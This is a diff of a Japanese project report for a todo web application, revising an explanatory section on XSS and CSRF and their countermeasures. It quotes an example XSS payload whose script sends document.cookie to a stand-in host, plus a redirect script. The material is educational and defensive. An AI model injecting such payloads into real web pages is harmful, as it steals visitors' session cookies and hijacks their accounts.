@@ -402,27 +402,23 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
   - XSS とは、Web アプリケーションに対して、意図しない JavaScript を注入する攻撃手法のこと
   - XSS を行うと、クライアントの Cookie を盗み出したり、クライアントの Cookie を改ざんしたりすることができる
 
-  具体例: `<script> document.location = 'http://example.com/?cookie=' + document.cookie </script>` という JavaScript をクライアントに送信すると、クライアントの Cookie が `http://example.com/?cookie=...` に送信されてしまう。example.com を攻撃者の所有するサーバーにすることで、クライアントの Cookie を盗み出すことができる。
+  具体例: `<script> document.location = 'http://example.com/?cookie=' + document.cookie </script>` という JavaScript がクライアント側で実行されると、クライアントの Cookie が `http://example.com/?cookie=...` に送信されてしまう。example.com を攻撃者の所有するサーバーにすることで、クライアントの Cookie を盗み出すことができる。
 
   もしくは、`<script> window.location = 'http://example.com/ </script>` という JavaScriptを埋め込むことに成功すると、そこを訪れたユーザーを任意のサイトに飛ばすことができる。
 
   - 対策:
 
-    - ユーザーからの入力をそのまま HTML に埋め込まないようにする。具体的には、エスケープ処理や、バリデーションを行うことが考えられる。
+    - 開発者としては、ユーザーからの入力をそのまま HTML に埋め込まないようにする。具体的には、エスケープ処理や、バリデーションを行うことが考えられる。
 
 - CSRF (Cross Site Request Forgery)
 
-  - CSRF とは、Web アプリケーションに対して、意図しないリクエストを送信する攻撃手法のこと
-  - CSRF を行うと、クライアントの Cookie を盗み出したり、クライアントの Cookie を改ざんしたりすることができる
+  - XSS との相違点は、クライアント側がログインしている正規のサービスに対して、意図しないリクエストを送信することで、攻撃を行う点である。XSSの場合は、Cookieなどクライント側の情報を盗み出したり、別サイトに誘導したりする形であったが、CSRFの場合は、クライアントがログインしている正規のサービスに対してユーザーの意図に反したリクエストを送ってしまう攻撃手法となっている。
 
-- CSRF 対策
-
-  - CSRF 対策とは、CSRF 攻撃を防ぐための対策のこと
-  - CSRF 対策としては、CSRF トークンを使用することがある
-  - CSRF トークンとは、クライアントがリクエストを送信する際に、サーバーから発行されるランダムな文字列のこと
-  - サーバーは、クライアントがリクエストを送信する際に、CSRF トークンをリクエストボディに含めるように要求する
-  - サーバーは、クライアントがリクエストを送信する際に、CSRF トークンを Cookie に含めるように要求する
-  - サーバーは、クライアントがリクエストを送信する際に、CSRF トークンをリクエストヘッダに含めるように要求する
+  - 対策
+    - Referer チェック
+      - リクエストの Referer ヘッダーをチェックして、リクエストが正規のサービスから送信されたものかどうかを確認する
+    - 確認
+      - センシティブな操作(例: ユーザーの削除)を行う前に、ユーザーに確認を求める
 
 #### 3.4 Server Side Rendering
 
